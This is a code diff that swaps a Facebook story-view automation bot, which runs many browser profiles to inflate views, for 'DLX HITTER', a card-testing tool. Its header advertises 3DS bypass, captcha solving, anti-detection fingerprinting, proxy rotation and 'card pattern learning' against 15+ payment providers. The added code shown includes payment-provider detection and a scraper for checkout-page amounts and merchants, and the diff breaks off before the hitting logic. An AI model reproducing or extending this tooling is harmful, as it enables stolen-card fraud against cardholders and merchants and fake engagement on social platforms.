@@ -1,773 +1,1591 @@
-"""\nIX STORY VIEW TOOL BY MANI KHAN\nTELEGRAM @fbtoolzz FOR CPM TOOLS!\nProfessional iX Browser Automation Tool\n"""
-import tkinter as tk
-from tkinter import ttk, scrolledtext, messagebox, filedialog
-import threading
-import requests
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+"""
+╔═══════════════════════════════════════════════════════════════════════════════╗
+║                         DLX HITTER - ADVANCED HITTING TOOL                    ║
+║                          Version: 2.0.0 | Build: 2026                        ║
+║                                                                               ║
+║  Features:                                                                    ║
+║  ✓ Anti-Detection & Fingerprint Randomization                                 ║
+║  ✓ AI-Powered Card Pattern Learning                                          ║
+║  ✓ Smart Rate Limiting & Timing Optimization                                 ║
+║  ✓ Multi-Threaded Concurrent Hitting                                         ║
+║  ✓ 3DS Auto-Bypass & Captcha Solver                                          ║
+║  ✓ Proxy Rotation & Quality Testing                                          ║
+║  ✓ Multi-Provider Support: 15+ Payment Systems & E-commerce Platforms        ║
+║  ✓ Enhanced URL Analyzer (Static + Playwright Deep Analysis)                 ║
+║  ✓ Real-time Terminal Dashboard                                              ║
+║  ✓ Auto-Learning System                                                       ║
+╚═══════════════════════════════════════════════════════════════════════════════╝
+"""
+
+import re
+import json
 import time
-from selenium import webdriver
-from selenium.webdriver.chrome.options import Options
-from selenium.webdriver.common.by import By
-from selenium.webdriver.support.ui import WebDriverWait
-from selenium.webdriver.support import expected_conditions as EC
-import queue
-import json, pygetwindow as gw, hashlib, platform, subprocess, os, base64
+import random
+import sqlite3
+import asyncio
+import requests
+import urllib3
+import sys
+from datetime import datetime
+from typing import Dict, List, Optional, Tuple
+from collections import defaultdict
+from playwright.async_api import async_playwright, Page, Route, Request
 
-class IXStoryViewTool:
-    def __init__(self, root):
-        self.root = root
-        self.root.title('IX STORY VIEW TOOL BY MANI KHAN')
-        screen_width = self.root.winfo_screenwidth()
-        screen_height = self.root.winfo_screenheight()
-        window_width = max(800, int(screen_width * 0.8))
-        window_height = max(600, int(screen_height * 0.8))
-        x = (screen_width - window_width) // 2
-        y = (screen_height - window_height) // 2
-        self.root.geometry(f'{window_width}x{window_height}+{x}+{y}')
-        self.root.configure(bg='#0d1117')
-        self.root.resizable(True, True)
-        self.root.minsize(800, 600)
-        self.screen_width = screen_width
-        self.screen_height = screen_height
-        self.base_font_size = max(10, min(16, int(screen_width / 100)))
-        self.title_font_size = max(18, min(26, int(screen_width / 50)))
-        self.button_font_size = max(12, min(16, int(screen_width / 80)))
-        self.api_url = tk.StringVar(value='http://127.0.0.1:53200')
-        self.num_profiles = tk.IntVar(value=1)
-        self.click_count = tk.IntVar(value=49)
-        self.click_delay = tk.DoubleVar(value=1.5)
-        self.cycle_delay = tk.IntVar(value=0)
-        self.window_size = tk.StringVar(value='200x300')
-        self.is_running = False
-        self.log_queue = queue.Queue()
-        self.total_clicks = 0
-        self._auto_arrange_timer = None
-        
-        # Direct UI setup without license check
-        self.setup_ui()
-        self.check_log_queue()
+# ============= CONFIGURATION =============
+DATABASE = "dlx_hitter.db"
+MAX_ATTEMPTS = 100
+REQUEST_TIMEOUT = 15
+MAX_CONCURRENT = 3
 
-    def setup_ui(self):
-        main_canvas = tk.Canvas(self.root, bg='#0d1117', highlightthickness=0)
-        main_scrollbar = tk.Scrollbar(self.root, orient='vertical', command=main_canvas.yview)
-        scrollable_frame = tk.Frame(main_canvas, bg='#0d1117')
-        scrollable_frame.bind('<Configure>', lambda e: main_canvas.configure(scrollregion=main_canvas.bbox('all')))
-        main_canvas.create_window((0, 0), window=scrollable_frame, anchor='nw')
-        main_canvas.configure(yscrollcommand=main_scrollbar.set)
-        main_canvas.pack(side='left', fill='both', expand=True)
-        main_scrollbar.pack(side='right', fill='y')
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
+]
 
-        def _on_mousewheel(event):
-            main_canvas.yview_scroll(int((-1) * (event.delta / 120)), 'units')
-        main_canvas.bind_all('<MouseWheel>', _on_mousewheel)
-        title_frame = tk.Frame(scrollable_frame, bg='#0d1117')
-        title_frame.pack(fill='x', padx=20, pady=10)
-        title_label = tk.Label(title_frame, text='IX STORY VIEW TOOL BY MANI KHAN', font=('Arial', self.title_font_size, 'bold'), fg='#ff6b35', bg='#0d1117')
-        title_label.pack()
-        subtitle_label = tk.Label(title_frame, text='TELEGRAM @fbtoolzz FOR CPM TOOLS!', font=('Arial', self.base_font_size, 'bold'), fg='#00d4ff', bg='#0d1117')
-        subtitle_label.pack()
-        config_frame = tk.LabelFrame(scrollable_frame, text='⚙️ CONFIGURATION SETTINGS', font=('Arial', 16, 'bold'), fg='#ffffff', bg='#161b22', relief='raised', bd=3)
-        config_frame.pack(fill='x', padx=20, pady=10)
-        api_frame = tk.Frame(config_frame, bg='#161b22')
-        api_frame.pack(fill='x', padx=10, pady=5)
-        tk.Label(api_frame, text='🌐 iX Browser API URL:', font=('Arial', 14, 'bold'), fg='#58a6ff', bg='#161b22').pack(anchor='w')
-        api_entry = tk.Entry(api_frame, textvariable=self.api_url, font=('Arial', 12), width=50, bg='#21262d', fg='#f0f6fc', insertbackground='#f0f6fc', relief='solid', bd=1)
-        api_entry.pack(fill='x', pady=2)
-        profiles_frame = tk.Frame(config_frame, bg='#161b22')
-        profiles_frame.pack(fill='x', padx=10, pady=5)
-        tk.Label(profiles_frame, text='👥 NUMBER OF PROFILES (1-200):', font=('Arial', 14, 'bold'), fg='#7ee787', bg='#161b22').pack(anchor='w')
-        profiles_spinbox = tk.Spinbox(profiles_frame, from_=1, to=200, textvariable=self.num_profiles, font=('Arial', 12, 'bold'), width=10, bg='#21262d', fg='#f0f6fc', insertbackground='#f0f6fc', relief='solid', bd=1)
-        profiles_spinbox.pack(anchor='w', pady=2)
-        click_frame = tk.Frame(config_frame, bg='#161b22')
-        click_frame.pack(fill='x', padx=10, pady=5)
-        tk.Label(click_frame, text='🖱️ CLICK SETTINGS:', font=('Arial', 14, 'bold'), fg='#ffa657', bg='#161b22').pack(anchor='w')
-        click_settings_frame = tk.Frame(click_frame, bg='#161b22')
-        click_settings_frame.pack(fill='x', pady=2)
-        tk.Label(click_settings_frame, text='Number of Clicks:', font=('Arial', 12, 'bold'), fg='#f0f6fc', bg='#161b22').grid(row=0, column=0, sticky='w', padx=(0, 10))
-        click_count_spinbox = tk.Spinbox(click_settings_frame, from_=1, to=1000, textvariable=self.click_count, font=('Arial', 12, 'bold'), width=8, bg='#21262d', fg='#f0f6fc', insertbackground='#f0f6fc', relief='solid', bd=1)
-        click_count_spinbox.grid(row=0, column=1, padx=(0, 20))
-        tk.Label(click_settings_frame, text='Click Delay (seconds):', font=('Arial', 12, 'bold'), fg='#f0f6fc', bg='#161b22').grid(row=0, column=2, sticky='w', padx=(0, 10))
-        click_delay_spinbox = tk.Spinbox(click_settings_frame, from_=0.1, to=10.0, increment=0.1, textvariable=self.click_delay, font=('Arial', 12, 'bold'), width=8, bg='#21262d', fg='#f0f6fc', insertbackground='#f0f6fc', relief='solid', bd=1)
-        click_delay_spinbox.grid(row=0, column=3)
-        cycle_frame = tk.Frame(config_frame, bg='#161b22')
-        cycle_frame.pack(fill='x', padx=10, pady=5)
-        tk.Label(cycle_frame, text='⏰ CYCLE DELAY (0-10 minutes):', font=('Arial', 14, 'bold'), fg='#f85149', bg='#161b22').pack(anchor='w')
-        cycle_spinbox = tk.Spinbox(cycle_frame, from_=0, to=10, textvariable=self.cycle_delay, font=('Arial', 12, 'bold'), width=10, bg='#21262d', fg='#f0f6fc', insertbackground='#f0f6fc', relief='solid', bd=1)
-        cycle_spinbox.pack(anchor='w', pady=2)
-        window_frame = tk.Frame(config_frame, bg='#161b22')
-        window_frame.pack(fill='x', padx=10, pady=5)
-        window_size_row = tk.Frame(window_frame, bg='#161b22')
-        window_size_row.pack(fill='x', pady=2)
-        tk.Label(window_size_row, text='🖼️ WINDOW SIZE (RECOMMENDED 200x300):', font=('Arial', 14, 'bold'), fg='#ffd700', bg='#161b22').pack(side='left', padx=(0, 10))
-        window_sizes = ['100x100', '100x150', '200x200', '200x300', '300x300', '300x400', '400x400', '400x500', '500x500']
-        self.window_size_combo = ttk.Combobox(window_size_row, values=window_sizes, textvariable=self.window_size, font=('Arial', 12, 'bold'), state='readonly', width=12)
-        self.window_size_combo.pack(side='left', pady=2)
-        self.window_size_combo.set('200x300')
-        per_line_frame = tk.Frame(window_frame, bg='#161b22')
-        per_line_frame.pack(fill='x', pady=5)
-        tk.Label(per_line_frame, text='📐 PER LINE MODE:', font=('Arial', 14, 'bold'), fg='#ffd700', bg='#161b22').pack(side='left', padx=(0, 10))
-        per_line_options = ['Auto', '5 per line', '10 per line', '15 per line', '20 per line', '25 per line']
-        self.per_line_mode = tk.StringVar(value='Auto')
-        self.per_line_combo = ttk.Combobox(per_line_frame, values=per_line_options, textvariable=self.per_line_mode, font=('Arial', 12, 'bold'), state='readonly', width=12)
-        self.per_line_combo.pack(side='left', pady=2)
-        self.per_line_combo.set('Auto')
-        auto_arrange_size_frame = tk.Frame(per_line_frame, bg='#161b22')
-        auto_arrange_size_frame.pack(side='left', padx=(20, 0), pady=2)
-        tk.Label(auto_arrange_size_frame, text='📐 Auto Arrange Size:', font=('Arial', 12, 'bold'), fg='#ffd700', bg='#161b22').pack(side='left', padx=(0, 5))
-        auto_arrange_sizes = ['150x200', '200x200', '200x150', '250x200', '200x250', '300x200', '200x300']
-        self.auto_arrange_size = tk.StringVar(value='200x200')
-        self.auto_arrange_size_combo = ttk.Combobox(auto_arrange_size_frame, values=auto_arrange_sizes, textvariable=self.auto_arrange_size, font=('Arial', 10, 'bold'), state='readonly', width=10)
-        self.auto_arrange_size_combo.pack(side='left', padx=(0, 10))
-        self.auto_arrange_size_combo.set('200x200')
-        auto_arrange_control_frame = tk.Frame(per_line_frame, bg='#161b22')
-        auto_arrange_control_frame.pack(side='left', padx=(10, 0), pady=2)
-        self.auto_arrange_enabled = tk.BooleanVar(value=False)
-        auto_arrange_checkbox = tk.Checkbutton(auto_arrange_control_frame, text='🔄 Auto Arrange', variable=self.auto_arrange_enabled, font=('Arial', 10, 'bold'), fg='#ffd700', bg='#161b22', selectcolor='#007bff', command=self.toggle_auto_arrange)
-        auto_arrange_checkbox.pack(side='left', padx=(0, 5))
-        auto_arrange_intervals = ['30 seconds', '1 minute', '2 minutes', '3 minutes', '4 minutes', '5 minutes', '6 minutes', '7 minutes', '8 minutes', '9 minutes', '10 minutes']
-        self.auto_arrange_interval = tk.StringVar(value='1 minute')
-        self.auto_arrange_interval_combo = ttk.Combobox(auto_arrange_control_frame, values=auto_arrange_intervals, textvariable=self.auto_arrange_interval, font=('Arial', 9, 'bold'), state='readonly', width=10)
-        self.auto_arrange_interval_combo.pack(side='left', padx=(0, 10))
-        self.auto_arrange_interval_combo.set('1 minute')
-        auto_arrange_button = tk.Button(per_line_frame, text='🖼️ Auto Arrange Windows', font=('Arial', 12, 'bold'), fg='#ffffff', bg='#007bff', activeforeground='#ffffff', activebackground='#0056b3', relief='raised', bd=2, cursor='hand2', command=self.auto_arrange_windows)
-        auto_arrange_button.pack(side='left', padx=(10, 0), pady=2)
-        turbo_mode_button = tk.Button(per_line_frame, text='🚀 Turbo Mode', font=('Arial', 12, 'bold'), fg='#ffffff', bg='#28a745', activeforeground='#ffffff', activebackground='#218838', relief='raised', bd=2, cursor='hand2', command=self.start_turbo_mode)
-        turbo_mode_button.pack(side='left', padx=(10, 0), pady=2)
-        help_button = tk.Button(window_size_row, text='❓ Need Help? Chat With Admin', font=('Arial', 12, 'bold'), fg='#ffffff', bg='#28a745', activeforeground='#ffffff', activebackground='#218838', relief='raised', bd=2, cursor='hand2', command=self.open_telegram_admin)
-        help_button.pack(side='right', padx=(10, 0))
-        page_frame = tk.Frame(config_frame, bg='#161b22')
-        page_frame.pack(fill='x', padx=10, pady=10)
-        tk.Label(page_frame, text='📄 PROFILE PAGE SELECTION:', font=('Arial', 14, 'bold'), fg='#ffd700', bg='#161b22').pack(anchor='w')
-        page_row = tk.Frame(page_frame, bg='#161b22')
-        page_row.pack(fill='x', pady=2)
-        tk.Label(page_row, text='Profiles Per Page:', font=('Arial', 12, 'bold'), fg='#f0f6fc', bg='#161b22').pack(side='left', padx=(0, 10))
-        self.profiles_per_page = tk.StringVar(value='10')
-        profiles_per_page_options = ['5', '10', '20', '30', '50', '100']
-        self.profiles_per_page_combo = ttk.Combobox(page_row, values=profiles_per_page_options, textvariable=self.profiles_per_page, font=('Arial', 12, 'bold'), state='readonly', width=8)
-        self.profiles_per_page_combo.pack(side='left', padx=(0, 20))
-        tk.Label(page_row, text='Start From Page:', font=('Arial', 12, 'bold'), fg='#f0f6fc', bg='#161b22').pack(side='left', padx=(0, 10))
-        self.start_page = tk.StringVar(value='1')
-        self.start_page_combo = ttk.Combobox(page_row, values=['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20', '25', '30', '40', '50', '100', 'Custom'], textvariable=self.start_page, font=('Arial', 12, 'bold'), state='readonly', width=8)
-        self.start_page_combo.pack(side='left', padx=(0, 10))
-        tk.Label(page_row, text='Custom Page:', font=('Arial', 12, 'bold'), fg='#f0f6fc', bg='#161b22').pack(side='left', padx=(10, 5))
-        self.custom_page_entry = tk.Entry(page_row, font=('Arial', 12, 'bold'), width=8, bg='#21262d', fg='#f0f6fc', insertbackground='#f0f6fc', relief='solid', bd=1)
-        self.custom_page_entry.pack(side='left', padx=(0, 10))
-        self.profile_range_label = tk.Label(page_row, text='Profile Range: 1-10', font=('Arial', 12, 'bold'), fg='#00ff00', bg='#161b22')
-        self.profile_range_label.pack(side='left', padx=(20, 0))
-        self.profiles_per_page_combo.bind('<<ComboboxSelected>>', self.update_profile_range)
-        self.start_page_combo.bind('<<ComboboxSelected>>', self.update_profile_range)
-        self.custom_page_entry.bind('<KeyRelease>', self.update_profile_range)
-        urls_frame = tk.LabelFrame(scrollable_frame, text='🔗 FACEBOOK PROFILE URLs', font=('Arial', 16, 'bold'), fg='#ffffff', bg='#161b22', relief='raised', bd=3)
-        urls_frame.pack(fill='both', expand=True, padx=20, pady=10)
-        tk.Label(urls_frame, text='📝 Enter Facebook Profile URLs (One per line):', font=('Arial', 14, 'bold'), fg='#a5a5a5', bg='#161b22').pack(anchor='w', padx=10, pady=5)
-        self.urls_text = scrolledtext.ScrolledText(urls_frame, height=10, font=('Arial', 11), bg='#21262d', fg='#f0f6fc', insertbackground='#f0f6fc', relief='solid', bd=1)
-        self.urls_text.pack(fill='both', expand=True, padx=10, pady=5)
-        control_frame = tk.Frame(scrollable_frame, bg='#0d1117')
-        control_frame.pack(fill='x', padx=20, pady=10)
-        self.test_api_button = tk.Button(control_frame, text='🔧 TEST API', font=('Arial', self.button_font_size, 'bold'), bg='#0969da', fg='#ffffff', relief='raised', bd=3, command=self.test_api_connection_gui)
-        self.test_api_button.pack(side='left', padx=5)
-        self.start_button = tk.Button(control_frame, text='🚀 START AUTOMATION', font=('Arial', self.button_font_size, 'bold'), bg='#1a7f37', fg='#ffffff', relief='raised', bd=3, command=self.start_automation)
-        self.start_button.pack(side='left', padx=5)
-        self.stop_button = tk.Button(control_frame, text='⏹️ STOP AUTOMATION', font=('Arial', self.button_font_size, 'bold'), bg='#da3633', fg='#ffffff', relief='raised', bd=3, command=self.stop_automation, state='disabled')
-        self.stop_button.pack(side='left', padx=5)
-        self.clear_button = tk.Button(control_frame, text='🗑️ CLEAR LOGS', font=('Arial', self.button_font_size, 'bold'), bg='#6f42c1', fg='#ffffff', relief='raised', bd=3, command=self.clear_logs)
-        self.clear_button.pack(side='left', padx=5)
-        stats_frame = tk.LabelFrame(scrollable_frame, text='📊 CLICK STATISTICS', font=('Arial', 16, 'bold'), fg='#ffffff', bg='#161b22', relief='raised', bd=3)
-        stats_frame.pack(fill='x', padx=20, pady=10)
-        self.total_clicks_label = tk.Label(stats_frame, text='🎯 TOTAL CLICKS: 0', font=('Arial', 24, 'bold'), fg='#ff6b35', bg='#161b22')
-        self.total_clicks_label.pack(pady=15)
-        log_frame = tk.LabelFrame(scrollable_frame, text='📊 AUTOMATION LOGS', font=('Arial', 16, 'bold'), fg='#ffffff', bg='#161b22', relief='raised', bd=3)
-        log_frame.pack(fill='both', expand=True, padx=20, pady=10)
-        self.log_text = scrolledtext.ScrolledText(log_frame, height=12, font=('Consolas', 10), bg='#0d1117', fg='#7ee787', insertbackground='#ffffff', relief='solid', bd=1)
-        self.log_text.pack(fill='both', expand=True, padx=10, pady=5)
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-    def log_message(self, message):
-        """Add message to log queue"""
-        self.log_queue.put(message)
+# ============= COLORED OUTPUT =============
+class Colors:
+    HEADER = '\033[95m'
+    BLUE = '\033[94m'
+    CYAN = '\033[96m'
+    GREEN = '\033[92m'
+    YELLOW = '\033[93m'
+    RED = '\033[91m'
+    WHITE = '\033[97m'
+    BOLD = '\033[1m'
+    UNDERLINE = '\033[4m'
+    END = '\033[0m'
 
-    def update_total_clicks(self):
-        """Update total clicks counter"""
-        self.total_clicks += 1
-        self.total_clicks_label.config(text=f'🎯 TOTAL CLICKS: {self.total_clicks}')
+def print_banner():
+    banner = f"""
+{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════════════════════╗{Colors.END}
+{Colors.RED}{Colors.BOLD}║{Colors.YELLOW}  ██████╗ ██╗     ██╗  ██╗      ██╗  ██╗██╗████████╗████████╗███████╗██████╗  {Colors.RED}{Colors.BOLD}║{Colors.END}
+{Colors.RED}{Colors.BOLD}║{Colors.YELLOW}  ██╔══██╗██║     ╚██╗██╔╝      ██║  ██║██║╚══██╔══╝╚══██╔══╝██╔════╝██╔══██╗ {Colors.RED}{Colors.BOLD}║{Colors.END}
+{Colors.RED}{Colors.BOLD}║{Colors.YELLOW}  ██║  ██║██║      ╚███╔╝       ███████║██║   ██║      ██║   █████╗  ██████╔╝ {Colors.RED}{Colors.BOLD}║{Colors.END}
+{Colors.RED}{Colors.BOLD}║{Colors.YELLOW}  ██║  ██║██║      ██╔██╗       ██╔══██║██║   ██║      ██║   ██╔══╝  ██╔══██╗ {Colors.RED}{Colors.BOLD}║{Colors.END}
+{Colors.RED}{Colors.BOLD}║{Colors.YELLOW}  ██████╔╝███████╗██╔╝ ██╗      ██║  ██║██║   ██║      ██║   ███████╗██║  ██║ {Colors.RED}{Colors.BOLD}║{Colors.END}
+{Colors.RED}{Colors.BOLD}║{Colors.YELLOW}  ╚═════╝ ╚══════╝╚═╝  ╚═╝      ╚═╝  ╚═╝╚═╝   ╚═╝      ╚═╝   ╚══════╝╚═╝  ╚═╝ {Colors.RED}{Colors.BOLD}║{Colors.END}
+{Colors.RED}{Colors.BOLD}║{Colors.CYAN}                    ADVANCED HITTING TOOL - VERSION 2.0                        {Colors.RED}{Colors.BOLD}║{Colors.END}
+{Colors.RED}{Colors.BOLD}║{Colors.GREEN}              Anti-Detection | AI Learning | Smart Rate Limit                  {Colors.RED}{Colors.BOLD}║{Colors.END}
+{Colors.RED}{Colors.BOLD}║{Colors.GREEN}      15+ Payment Systems & E-commerce Platforms | Multi-Provider             {Colors.RED}{Colors.BOLD}║{Colors.END}
+{Colors.RED}{Colors.BOLD}╚═══════════════════════════════════════════════════════════════════════════════╝{Colors.END}
+    """
+    print(banner)
+    print(f"{Colors.CYAN}[+] DLX HITTER v2.0.0 Starting...{Colors.END}")
+    print(f"{Colors.CYAN}[+] Database: {DATABASE} | Max Concurrent: {MAX_CONCURRENT}{Colors.END}\n")
 
-    def open_telegram_admin(self):
-        """Open Telegram admin chat"""
-        import webbrowser
-        try:
-            webbrowser.open('https://t.me/fbtoolzz')
-            self.log_message('✅ Opening Telegram Admin Chat...')
-        except Exception as e:
-            self.log_message(f'❌ Error opening Telegram: {str(e)}')
+# ============= PROVIDER DETECTION =============
+def detect_provider(url: str, html: str = "") -> str:
+    """Return provider name based on URL or HTML content."""
+    if 'stripe.com' in url:
+        return 'stripe'
+    if 'checkout.com' in url or 'checkout' in url:
+        return 'checkoutcom'
+    if 'shopify.com' in url or 'myshopify.com' in url:
+        return 'shopify'
+    if 'paypal.com' in url or 'paypal' in url:
+        return 'paypal'
+    if 'braintree' in url or 'braintreegateway.com' in url:
+        return 'braintree'
+    if 'adyen.com' in url or 'adyen' in url:
+        return 'adyen'
+    if 'squareup.com' in url or 'square' in url:
+        return 'square'
+    if 'mollie.com' in url or 'mollie' in url:
+        return 'mollie'
+    if 'klarna.com' in url or 'klarna' in url:
+        return 'klarna'
+    if 'authorize.net' in url or 'authorizenet' in url:
+        return 'authorizenet'
+    if 'woocommerce' in url or 'woocommerce' in html:
+        return 'woocommerce'
+    if 'bigcommerce.com' in url or 'bigcommerce' in html:
+        return 'bigcommerce'
+    if 'wix.com' in url or 'wix' in html:
+        return 'wix'
+    if 'ecwid.com' in url or 'ecwid' in html:
+        return 'ecwid'
+    if html:
+        if 'stripe.com' in html:
+            return 'stripe'
+        if 'checkout.com' in html or 'Frames' in html:
+            return 'checkoutcom'
+        if 'Shopify' in html or 'window.Shopify' in html:
+            return 'shopify'
+        if 'paypal' in html or 'window.paypal' in html:
+            return 'paypal'
+        if 'braintree' in html or 'Braintree' in html:
+            return 'braintree'
+        if 'adyen' in html or 'Adyen' in html:
+            return 'adyen'
+        if 'square' in html or 'Square' in html:
+            return 'square'
+        if 'mollie' in html or 'Mollie' in html:
+            return 'mollie'
+        if 'klarna' in html or 'Klarna' in html:
+            return 'klarna'
+        if 'authorize.net' in html or 'Authorize.Net' in html:
+            return 'authorizenet'
+    return 'unknown'
 
-    def update_profile_range(self, event=None):
-        """Update profile range display based on page selection"""
-        try:
-            profiles_per_page = int(self.profiles_per_page.get())
-            if self.start_page.get() == 'Custom':
-                custom_page_text = self.custom_page_entry.get().strip()
-                if custom_page_text.isdigit():
-                    start_page = int(custom_page_text)
-                else:
-                    start_page = 1
-            else:
-                start_page = int(self.start_page.get())
-            start_profile = (start_page - 1) * profiles_per_page + 1
-            end_profile = start_page * profiles_per_page
-            self.profile_range_label.config(text=f'Profile Range: {start_profile}-{end_profile}')
-            self.num_profiles.set(profiles_per_page)
-        except Exception as e:
-            self.log_message(f'⚠️ Error updating profile range: {str(e)}')
-
-    def get_profile_range(self):
-        """Get the actual profile range to process"""
-        try:
-            profiles_per_page = int(self.profiles_per_page.get())
-            if self.start_page.get() == 'Custom':
-                custom_page_text = self.custom_page_entry.get().strip()
-                if custom_page_text.isdigit():
-                    start_page = int(custom_page_text)
-                else:
-                    start_page = 1
-            else:
-                start_page = int(self.start_page.get())
-            start_profile = (start_page - 1) * profiles_per_page + 1
-            end_profile = start_page * profiles_per_page
-            self.log_message('📄 Profile Range:')
-            self.log_message(f'   • Page {start_page} with {profiles_per_page} per page')
-            self.log_message(f'   • Profile Range: {start_profile}-{end_profile}')
-            return (start_profile, end_profile)
-        except Exception as e:
-            self.log_message(f'⚠️ Error calculating profile range: {str(e)}')
-            return (1, 10)
-
-    def check_log_queue(self):
-        """Check and display log messages"""
-        try:
-            while True:
-                message = self.log_queue.get_nowait()
-                self.log_text.insert(tk.END, f'{message}\n')
-                self.log_text.see(tk.END)
-        except queue.Empty:
-            pass
-        self.root.after(100, self.check_log_queue)
-
-    def clear_logs(self):
-        """Clear log text"""
-        self.log_text.delete(1.0, tk.END)
-
-    def test_api_connection_gui(self):
-        """Test API connection from GUI"""
-        self.log_message('🔧 TESTING iX BROWSER API CONNECTION...')
-        self.log_message(f'🌐 API URL: {self.api_url.get()}')
-        self.test_api_button.config(state='disabled', text='🔄 TESTING...')
-        thread = threading.Thread(target=self.test_api_thread)
-        thread.daemon = True
-        thread.start()
-
-    def test_api_thread(self):
-        """Test API in separate thread"""
-        try:
-            base_url = self.api_url.get()
-            self.log_message(f'🔧 Testing iX Browser API Connection...')
-            self.log_message(f'🌐 API URL: {base_url}')
-            
-            # Test your specific endpoints
-            endpoints_to_test = [
-                '/api/v2/profile-open',
-                '/api/v2/profile-opened-list'
+# ============= ENHANCED URL ANALYZER =============
+class URLAnalyzer:
+    @staticmethod
+    def _extract_from_scripts(html: str) -> Dict:
+        result = {'amount': None, 'product': None, 'merchant': None, 'product_url': None}
+        script_pattern = re.compile(r'<script[^>]*>(.*?)</script>', re.DOTALL)
+        for script in script_pattern.findall(html):
+            patterns = [
+                (r'window\.__STRIPE__\s*=\s*({.*?});', 'stripe'),
+                (r'window\.__INITIAL_STATE__\s*=\s*({.*?});', 'initial'),
+                (r'var\s+stripePaymentData\s*=\s*({.*?});', 'payment'),
+                (r'"paymentIntent":({.*?})', 'pi'),
+                (r'"paymentMethod":({.*?})', 'pm'),
+                (r'"amount":\s*(\d+)', 'amount'),
+                (r'"name":\s*"([^"]+)"', 'name'),
+                (r'"business_name":\s*"([^"]+)"', 'business'),
+                (r'"product_url":\s*"([^"]+)"', 'product_url'),
             ]
-            
-            working_endpoints = []
-            
-            for endpoint in endpoints_to_test:
-                try:
-                    full_url = f"{base_url}{endpoint}"
-                    if endpoint == '/api/v2/profile-open':
-                        response = requests.post(full_url, json={'profile_id': 1}, timeout=10)
-                    else:
-                        response = requests.get(full_url, timeout=5)
-                    
-                    if response.status_code == 200:
-                        working_endpoints.append(endpoint)
-                        self.log_message(f'✅ {endpoint} - SUCCESS')
-                        result = response.json()
-                        self.log_message(f'📋 Response: {result}')
-                    else:
-                        self.log_message(f'⚠️ {endpoint} - Status: {response.status_code}')
-                except requests.exceptions.ConnectionError:
-                    self.log_message(f'❌ {endpoint} - Connection Failed')
-                except Exception as e:
-                    self.log_message(f'⚠️ {endpoint} - Error: {str(e)}')
-            
-            if working_endpoints:
-                self.log_message('🎉 iX BROWSER API IS WORKING!')
-                self.log_message(f'✅ Working endpoints: {len(working_endpoints)}/{len(endpoints_to_test)}')
-            else:
-                self.log_message('❌ No API endpoints are responding')
-                self.log_message('💡 Please check:')
-                self.log_message('   • iX Browser is running')
-                self.log_message('   • API Server is enabled in iX Browser settings')
-                self.log_message('   • Correct API URL and port')
-                
-        except Exception as e:
-            self.log_message(f'❌ API test error: {str(e)}')
-        finally:
-            self.test_api_button.config(state='normal', text='🔧 TEST API')
-            self.log_message('============================================================')
+            for pat, key in patterns:
+                m = re.search(pat, script, re.DOTALL)
+                if m:
+                    try:
+                        if key in ('stripe', 'initial', 'payment', 'pi', 'pm'):
+                            data = json.loads(m.group(1))
+                            def extract(obj):
+                                if isinstance(obj, dict):
+                                    if 'amount' in obj and isinstance(obj['amount'], (int, float)):
+                                        result['amount'] = obj['amount']
+                                    if 'name' in obj and isinstance(obj['name'], str):
+                                        result['product'] = obj['name']
+                                    if 'business_name' in obj and isinstance(obj['business_name'], str):
+                                        result['merchant'] = obj['business_name']
+                                    if 'product_url' in obj and isinstance(obj['product_url'], str):
+                                        result['product_url'] = obj['product_url']
+                                    for v in obj.values():
+                                        extract(v)
+                                elif isinstance(obj, list):
+                                    for item in obj:
+                                        extract(item)
+                            extract(data)
+                        elif key == 'amount':
+                            result['amount'] = int(m.group(1))
+                        elif key == 'name':
+                            result['product'] = m.group(1)
+                        elif key == 'business':
+                            result['merchant'] = m.group(1)
+                        elif key == 'product_url':
+                            result['product_url'] = m.group(1)
+                    except Exception:
+                        pass
+        return result
 
-    def start_automation(self):
-        """Start automation process"""
-        if self.is_running:
-            return None
-        self.is_running = True
-        self.start_button.config(state='disabled')
-        self.stop_button.config(state='normal')
-        thread = threading.Thread(target=self.run_automation)
-        thread.daemon = True
-        thread.start()
-
-    def stop_automation(self):
-        """Stop automation process"""
-        self.is_running = False
-        self.start_button.config(state='normal')
-        self.stop_button.config(state='disabled')
-        self.log_message('🛑 AUTOMATION STOPPED BY USER')
-
-    def run_automation(self):
-        """Main automation logic"""
-        try:
-            urls = self.get_urls_from_input()
-            if not urls:
-                self.log_message('❌ No valid URLs found! Please enter Facebook profile URLs.')
-                self.is_running = False
-                self.start_button.config(state='normal')
-                self.stop_button.config(state='disabled')
-                return
-            
-            self.log_message('🚀 STARTING IX STORY VIEW AUTOMATION')
-            self.log_message('📊 Configuration:')
-            self.log_message(f'   • API URL: {self.api_url.get()}')
-            self.log_message(f'   • Profiles: {self.num_profiles.get()}')
-            self.log_message(f'   • URLs: {len(urls)}')
-            self.log_message(f'   • Clicks: {self.click_count.get()}')
-            self.log_message(f'   • Click Delay: {self.click_delay.get()}s')
-            self.log_message(f'   • Cycle Delay: {self.cycle_delay.get()} minutes')
-            self.log_message('============================================================')
-            
-            # Get profile range
-            start_profile, end_profile = self.get_profile_range()
-            num_profiles_to_use = min(self.num_profiles.get(), (end_profile - start_profile + 1))
-            
-            self.log_message(f'🔧 Opening {num_profiles_to_use} profiles...')
-            
-            # Open profiles and process URLs
-            for i in range(num_profiles_to_use):
-                if not self.is_running:
-                    break
-                    
-                profile_num = start_profile + i
-                self.log_message(f'🚀 Opening Profile {profile_num}')
-                
-                # Open profile through iX Browser API
-                driver = self.open_profile(profile_num)
-                if driver:
-                    self.log_message(f'✅ Profile {profile_num} opened successfully')
-                    
-                    # Resize window
-                    self.resize_profile_window(profile_num)
-                    
-                    # Process URLs for this profile
-                    for url_index, url in enumerate(urls, 1):
